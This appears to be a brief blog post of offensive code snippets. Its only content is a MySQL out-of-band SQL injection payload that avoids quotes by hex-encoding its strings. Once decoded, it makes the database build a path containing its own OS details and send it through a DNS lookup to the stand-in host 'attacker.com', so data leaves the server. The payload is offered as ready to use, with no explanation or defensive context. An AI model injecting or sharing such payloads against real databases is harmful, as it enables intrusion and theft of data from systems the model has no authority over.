---
layout: post
title: "Introduction"
author: "Sahil Dhar"
---



## Code Snippets

###\[MySQL\] Out of Band SQL Injection \[Without Quotes\] 

```mysql
12,13) union select LOAD_FILE(group_concat(0x2f2f2f2f,(select @@version_compile_os),0x2e61747461636b65722e636f6d2f2f6d7973716c5f65787472616374)),2 -- 
```

